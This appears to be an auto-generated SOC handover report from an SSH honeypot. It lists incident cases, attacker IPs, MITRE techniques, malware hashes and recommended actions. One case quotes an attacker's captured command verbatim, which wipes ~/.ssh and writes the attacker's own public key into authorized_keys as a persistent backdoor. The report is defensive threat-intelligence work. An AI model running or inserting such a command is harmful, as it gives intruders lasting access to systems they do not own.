| `2026-04-23 09:11:07` | `cowrie.session.params` |
| `2026-04-23 09:11:07` | `cowrie.command.input` |
| `2026-04-23 09:11:07` | `cowrie.command.failed` |
| `2026-04-23 09:11:08` | `cowrie.log.closed` |
| `2026-04-23 09:11:08` | `cowrie.session.params` |
| `2026-04-23 09:11:08` | `cowrie.command.input` |
| `2026-04-23 09:11:08` | `cowrie.session.file_download` |
| `2026-04-23 09:11:08` | `cowrie.log.closed` |
| `2026-04-23 09:11:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.200.228[.]35` to AbuseIPDB if not already reported
- [ ] Block `172.200.228[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d4b68f327ad

| Field | Detail |
|---|---|
| **Source IP** | `172.200.228[.]35` |
| **First Seen** | 2026-04-23 09:11 |
| **Last Seen** | 2026-04-23 09:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 09:11:11` | `cowrie.session.connect` |
| `2026-04-23 09:11:11` | `cowrie.client.version` |
| `2026-04-23 09:11:11` | `cowrie.client.kex` |
| `2026-04-23 09:11:12` | `cowrie.login.success` |
| `2026-04-23 09:11:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.200.228[.]35` to AbuseIPDB if not already reported
- [ ] Block `172.200.228[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0777ad019f1c

| Field | Detail |
|---|---|
| **Source IP** | `172.200.228[.]35` |
| **First Seen** | 2026-04-23 09:12 |
| **Last Seen** | 2026-04-23 09:12 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 09:12:09` | `cowrie.session.connect` |
| `2026-04-23 09:12:09` | `cowrie.client.version` |
| `2026-04-23 09:12:09` | `cowrie.client.kex` |
| `2026-04-23 09:12:10` | `cowrie.login.success` |
| `2026-04-23 09:12:10` | `cowrie.session.params` |
| `2026-04-23 09:12:10` | `cowrie.command.input` |
| `2026-04-23 09:12:10` | `cowrie.command.failed` |
| `2026-04-23 09:12:10` | `cowrie.log.closed` |
| `2026-04-23 09:12:11` | `cowrie.session.params` |
| `2026-04-23 09:12:11` | `cowrie.command.input` |
| `2026-04-23 09:12:11` | `cowrie.session.file_download` |
| `2026-04-23 09:12:11` | `cowrie.log.closed` |
| `2026-04-23 09:12:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.200.228[.]35` to AbuseIPDB if not already reported
- [ ] Block `172.200.228[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7631c8cc830a

| Field | Detail |
|---|---|
| **Source IP** | `172.200.228[.]35` |
| **First Seen** | 2026-04-23 09:12 |
| **Last Seen** | 2026-04-23 09:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 09:12:14` | `cowrie.session.connect` |
| `2026-04-23 09:12:14` | `cowrie.client.version` |
| `2026-04-23 09:12:14` | `cowrie.client.kex` |
| `2026-04-23 09:12:15` | `cowrie.login.success` |
| `2026-04-23 09:12:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.200.228[.]35` to AbuseIPDB if not already reported
- [ ] Block `172.200.228[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f7ca68e4484

| Field | Detail |
|---|---|
| **Source IP** | `47.103.2[.]38` |
| **First Seen** | 2026-04-23 09:38 |
| **Last Seen** | 2026-04-23 09:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 09:38:17` | `cowrie.session.connect` |
| `2026-04-23 09:38:17` | `cowrie.client.version` |
| `2026-04-23 09:38:17` | `cowrie.client.kex` |
| `2026-04-23 09:38:17` | `cowrie.login.success` |
| `2026-04-23 09:38:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.103.2[.]38` to AbuseIPDB if not already reported
- [ ] Block `47.103.2[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-306a4a84703d

| Field | Detail |
|---|---|
| **Source IP** | `45.10.175[.]77` |
| **First Seen** | 2026-04-23 09:44 |
| **Last Seen** | 2026-04-23 09:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 09:44:21` | `cowrie.session.connect` |
| `2026-04-23 09:44:21` | `cowrie.client.version` |
| `2026-04-23 09:44:21` | `cowrie.client.kex` |
| `2026-04-23 09:44:22` | `cowrie.login.success` |
| `2026-04-23 09:44:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.10.175[.]77` to AbuseIPDB if not already reported
- [ ] Block `45.10.175[.]77` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `172.200.228[.]35` | **26** | 2026-04-23 07:56 | 2026-04-23 09:17 | 0m | 26 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `180.76.57[.]208` | **17** | 2026-04-23 06:08 | 2026-04-23 06:48 | 22m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `34.62.194[.]93` | **11** | 2026-04-23 07:42 | 2026-04-23 07:42 | 0m | 0 | `T1592` | 🟠 MEDIUM |
| `18.116.101[.]220` | **7** | 2026-04-23 09:12 | 2026-04-23 09:18 | 0m | 6 | `T1110.001` | 🟢 LOW |
| `3.129.187[.]38` | **6** | 2026-04-23 08:35 | 2026-04-23 08:41 | 0m | 6 | `T1110.001` | 🟢 LOW |
| `47.254.72[.]143` | **3** | 2026-04-23 09:38 | 2026-04-23 09:39 | 0m | 2 | `T1110.001` | 🟢 LOW |
| `120.27.154[.]152` | **2** | 2026-04-23 07:29 | 2026-04-23 07:33 | 2m | 0 | `T1592` | 🟢 LOW |
| `120.86.119[.]165` | **2** | 2026-04-23 06:42 | 2026-04-23 06:49 | 2m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `20.80.83[.]86` | **2** | 2026-04-23 08:23 | 2026-04-23 08:23 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.84.145[.]58` | **2** | 2026-04-23 06:54 | 2026-04-23 06:55 | 0m | 0 | `T1592` | 🟢 LOW |
| `204.76.203[.]73` | **2** | 2026-04-23 08:43 | 2026-04-23 08:43 | 0m | 0 | `T1592` | 🟢 LOW |
| `34.62.39[.]48` | **2** | 2026-04-23 07:42 | 2026-04-23 07:42 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `105.186.99[.]73` | 1 | 2026-04-23 06:23 | 2026-04-23 06:23 | 30s | 0 | `T1592` | 🟢 LOW |
| `172.104.93[.]159` | 1 | 2026-04-23 07:21 | 2026-04-23 07:22 | 10s | 0 | `T1592` | 🟢 LOW |
| `178.17.49[.]86` | 1 | 2026-04-23 07:35 | 2026-04-23 07:35 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.76.172[.]156` | 1 | 2026-04-23 09:46 | 2026-04-23 09:46 | 0s | 0 | `T1592` | 🟢 LOW |
| `204.76.203[.]225` | 1 | 2026-04-23 08:43 | 2026-04-23 08:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `204.76.203[.]226` | 1 | 2026-04-23 08:43 | 2026-04-23 08:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `213.57.170[.]43` | 1 | 2026-04-23 06:55 | 2026-04-23 06:56 | 53s | 0 | `T1592` | 🟢 LOW |
| `91.92.243[.]49` | 1 | 2026-04-23 08:54 | 2026-04-23 08:54 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (23 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `213.57.170[.]43` | IL | Hot-Net internet services Ltd. | **100** ⚠️ | 5 |
| `120.27.154[.]152` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 50 |
| `47.254.72[.]143` | US | Alibaba Cloud - US | **100** ⚠️ | 7 |
| `120.86.119[.]165` | CN | Hengda-Plastic-electrical-products, Dongguan, Guangdong province | **100** ⚠️ | 10 |
| `18.116.101[.]220` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `204.76.203[.]226` | NL | Intelligence Hosting LLC | **100** ⚠️ | 4 |
| `34.62.194[.]93` | BE | Google LLC | **100** ⚠️ | 0 |
| `172.200.228[.]35` | US | Microsoft Limited | **100** ⚠️ | 50 |
| `34.62.39[.]48` | BE | Google LLC | **100** ⚠️ | 0 |
| `105.186.99[.]73` | ZA | Telkom_Internet_Broadband_105_186 | **100** ⚠️ | 15 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 77 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 38 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 18 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 8 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 8 |

---

## 🔕 False Positive Summary (30 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 19 below threshold 25 | 1 |
| AbuseIPDB score 23 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 27 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 138 cases |
| Tool 34  | Credential Extractor        | ✅ 66 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 10 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 28 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 30 filtered (21.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 16 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 23 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 18 priority case(s) shown individually · 20 recon entry/entries in table (12 group(s) consolidating 82 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-23T09:48:57Z_
